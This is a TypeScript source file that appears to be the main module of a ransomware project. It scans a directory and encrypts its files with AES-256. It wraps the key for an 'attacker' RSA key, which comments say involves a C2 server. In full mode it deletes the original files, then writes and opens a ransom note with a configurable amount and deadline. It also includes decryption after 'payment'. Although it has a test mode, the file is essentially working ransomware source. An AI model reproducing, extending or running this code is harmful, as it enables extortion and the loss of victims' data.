import fs from 'fs'
import path from 'path'
import { encryptFile, decryptFile } from './aesEncryption'
import {
    initializeKeyManagement,
    storeFileIV,
    encryptAESKey,
    decryptAESKey,
    createKeyMetadataFile,
    readKeyMetadataFile
} from './keyManager'
import { scanDirectory, getTestTargetFiles } from './fileScanner'
import { createRansomNote } from './ransomNote'
import { RansomwareLogger, LogLevel } from './logger'
import { loadConfig } from './config'
import { openRansomNote } from './openRansomNote'

// Load configuration
const config = loadConfig()

// File extension for encrypted files
const ENCRYPTED_EXTENSION = config.encryptedExtension

// Initialize logger
const logger = new RansomwareLogger(path.join(process.cwd(), 'logs'))

// Function to encrypt all target files in a directory
export async function encryptTargetFiles(
    targetDirectory: string,
    isTestMode: boolean = true
): Promise<{
    victimId: string
    encryptedAESKey: Buffer
    attackerPrivateKey: string
    encryptedFiles: string[]
    encryptionStats: {
        totalFiles: number,
        totalSize: number,
        encryptionTime: number,
        targetExtensions: string[],
        timestamp: Date
    }
}> {
    logger.info(`Initializing ransomware encryption process...`)
    
    const startTime = Date.now();
    const encryptionStats = {
        totalFiles: 0,
        totalSize: 0,
        encryptionTime: 0,
        targetExtensions: [] as string[],
        timestamp: new Date()
    };    // Initialize key management (now connects to C2 server)
    const { victimId, aesKey, attackerPublicKey, attackerPrivateKey } =
        await initializeKeyManagement()
    logger.info(`Victim ID generated: ${victimId}`)
    logger.encryption(`AES-256 key generated for file encryption`)
    logger.encryption(`RSA-2048 key pair generated for key encryption`)

    // Create backup keys if configured
    if (config.createBackupKeys) {
        // In a real implementation, this would save the keys somewhere safe
        logger.info(`Backup keys created (enabled in configuration)`)
    }

    // Get target files
    let targetFiles: string[]
    if (isTestMode) {
        logger.info(
            `Running in TEST MODE - targeting a limited number of files`
        )
        targetFiles = getTestTargetFiles(
            targetDirectory, 
            config.maxFilesToEncrypt, 
            config.maxTargetFileSizeMB
        )
    } else {
        logger.info(`Running in FULL MODE - scanning for all target files`)
        targetFiles = scanDirectory(targetDirectory, config.maxScanDepth)
    }

    // Get unique file extensions for statistics
    const uniqueExtensions = new Set<string>();
    targetFiles.forEach(file => {
        const ext = path.extname(file).toLowerCase();
        if (ext) uniqueExtensions.add(ext);
    });
    encryptionStats.targetExtensions = Array.from(uniqueExtensions);

    logger.info(`Found ${targetFiles.length} target files with extensions: ${Array.from(uniqueExtensions).join(', ')}`)
    encryptionStats.totalFiles = targetFiles.length;
    
    // Encrypt each file
    const encryptedFiles: string[] = []
    let totalEncryptionTime = 0;
    
    for (const filePath of targetFiles) {
        try {
            const encryptedPath = `${filePath}${ENCRYPTED_EXTENSION}`
            logger.encryption(`Encrypting file: ${filePath}`)
            
            const fileStats = fs.statSync(filePath);
            encryptionStats.totalSize += fileStats.size;
            
            const fileEncryptStartTime = Date.now();
            
            // Encrypt the file
            const { iv } = await encryptFile(filePath, encryptedPath, aesKey)
            
            const fileEncryptTime = (Date.now() - fileEncryptStartTime) / 1000;
            totalEncryptionTime += fileEncryptTime;
            
            // Log the details of the crypto operation
            logger.logCryptoOperation('encrypt', 'AES-256-CBC', 256, {
                filePath,
                fileSize: fileStats.size,
                elapsedTime: fileEncryptTime,
                success: true
            });            // Store the IV for this file (now connects to C2 server)
            await storeFileIV(victimId, filePath, iv)
            logger.encryption(`IV stored for file: ${filePath}`)

            // Add to the list of encrypted files
            encryptedFiles.push(filePath)

            // Delete original file if configured
            if (config.deleteOriginalFiles && !isTestMode) {
                logger.warning(`Deleting original file (enabled in configuration): ${filePath}`)
                try {
                    fs.unlinkSync(filePath)
                } catch (deleteErr) {
                    logger.error(`Failed to delete original file: ${deleteErr}`)
                }
            } else if (!isTestMode) {
                logger.warning(`Would delete original file: ${filePath} (disabled in configuration)`)
            }
        } catch (err) {
            logger.error(`Error encrypting ${filePath}: ${err}`)
        }
    }    // Encrypt the AES key with the attacker's public key (now connects to C2 server)
    const encryptedAESKey = await encryptAESKey(aesKey, attackerPublicKey)
    logger.encryption(`AES key encrypted with RSA-2048 public key`)
    logger.logCryptoOperation('encrypt', 'RSA-2048-OAEP', 2048, {
        success: true,
        elapsedTime: 0
    });

    // Create metadata file
    createKeyMetadataFile(victimId, encryptedAESKey, targetDirectory)
    logger.info(`Created metadata file with encrypted keys and IVs`)

    // Create ransom note with configured amount
    createRansomNote(
        victimId, 
        targetDirectory, 
        encryptedFiles.length, 
        {
            amount: config.ransomAmount,
            currency: config.ransomCurrency,
            deadlineHours: config.ransomDeadlineHours,
            priceIncrease: config.ransomPriceIncrease
        }    )    
    logger.info(`Created ransom note`)

    // Change wallpaper if configured
    if (config.changeWallpaper && !isTestMode) {
        logger.info(`Changing desktop wallpaper (enabled in configuration)`)
        // Implementation would go here
    }    // Open the ransom note in the browser
    try {
        await openRansomNote(targetDirectory);
        logger.info("Opened ransom note in default browser");
    } catch (error) {
        logger.error(`Failed to open ransom note: ${error}`);
    }
    
    // Calculate total encryption time and generate summary
    encryptionStats.encryptionTime = totalEncryptionTime;
    const summaryReport = logger.generateSummaryReport(encryptionStats);
    logger.success(`Encryption process completed. ${encryptedFiles.length} files encrypted.`);

    return {
        victimId,
        encryptedAESKey,
        attackerPrivateKey,
        encryptedFiles,
        encryptionStats
    }
}

// Function to decrypt files after "payment"
export async function decryptFiles(
    targetDirectory: string,
    encryptedAESKey: Buffer,
    attackerPrivateKey: string
): Promise<string[]> {
    logger.info(`Initializing decryption process...`)
    
    const startTime = Date.now();
    let totalDecryptionTime = 0;
    let totalSize = 0;
    let successfulDecryptions = 0;

    // Find and read the metadata file
    const metadataPath = path.join(targetDirectory, '.ransom_metadata')
    if (!fs.existsSync(metadataPath)) {
        const errorMsg = `Metadata file not found at ${metadataPath}`;
        logger.error(errorMsg);
        throw new Error(errorMsg)
    }

    // Read the metadata
    const { victimId, ivMap } = readKeyMetadataFile(
        metadataPath,
        targetDirectory
    )
    logger.info(`Found metadata for victim ID: ${victimId}`)    // Decrypt the AES key
    const aesKey = await decryptAESKey(encryptedAESKey, attackerPrivateKey)
    logger.decryption(`Successfully decrypted the AES key with RSA private key`)
    logger.logCryptoOperation('decrypt', 'RSA-2048-OAEP', 2048, {
        success: true
    });

    // Decrypt each file
    const decryptedFiles: string[] = []
    for (const [filePath, iv] of ivMap.entries()) {
        try {
            const encryptedPath = `${filePath}${ENCRYPTED_EXTENSION}`

            // Check if the encrypted file exists
            if (!fs.existsSync(encryptedPath)) {
                logger.error(`Encrypted file not found: ${encryptedPath}`)
                continue
            }

            logger.decryption(`Decrypting file: ${filePath}`)
            
            const fileStats = fs.statSync(encryptedPath);
            totalSize += fileStats.size;
            
            const fileDecryptStartTime = Date.now();

            // Decrypt the file
            await decryptFile(encryptedPath, filePath, aesKey, iv)
            
            const fileDecryptTime = (Date.now() - fileDecryptStartTime) / 1000;
            totalDecryptionTime += fileDecryptTime;
            
            logger.logCryptoOperation('decrypt', 'AES-256-CBC', 256, {
                filePath,
                fileSize: fileStats.size,
                elapsedTime: fileDecryptTime,
                success: true
            });

            // Add to the list of decrypted files
            decryptedFiles.push(filePath)
            successfulDecryptions++;

            // Delete the encrypted file
            fs.unlinkSync(encryptedPath)
            logger.info(`Deleted encrypted file: ${encryptedPath}`)
        } catch (err) {
            logger.error(`Error decrypting ${filePath}: ${err}`)
        }
    }

    // Delete the metadata file
    fs.unlinkSync(metadataPath)
    logger.info(`Deleted metadata file`)

    // Delete the ransom note
    const txtNotePath = path.join(targetDirectory, 'RANSOM_NOTE.txt')
    const htmlNotePath = path.join(targetDirectory, 'RANSOM_NOTE.html')
    const bgChangerPath = path.join(targetDirectory, 'change_background.bat')

    if (fs.existsSync(txtNotePath)) {
        fs.unlinkSync(txtNotePath)
    }

    if (fs.existsSync(htmlNotePath)) {
        fs.unlinkSync(htmlNotePath)
    }

    if (fs.existsSync(bgChangerPath)) {
        fs.unlinkSync(bgChangerPath)
    }

    logger.info(`Deleted ransom notes`)
    
    // Log summary of decryption process
    const totalTime = (Date.now() - startTime) / 1000;
    logger.success(`Decryption process completed in ${totalTime.toFixed(2)} seconds`);
    logger.success(`Successfully decrypted ${successfulDecryptions} of ${ivMap.size} files`);
    logger.success(`Total data processed: ${(totalSize / (1024 * 1024)).toFixed(2)} MB`);
    
    if (successfulDecryptions === ivMap.size) {
        logger.success(`All files successfully recovered!`);
    } else {
        logger.warning(`Some files (${ivMap.size - successfulDecryptions}) could not be decrypted.`);
    }

    return decryptedFiles
}
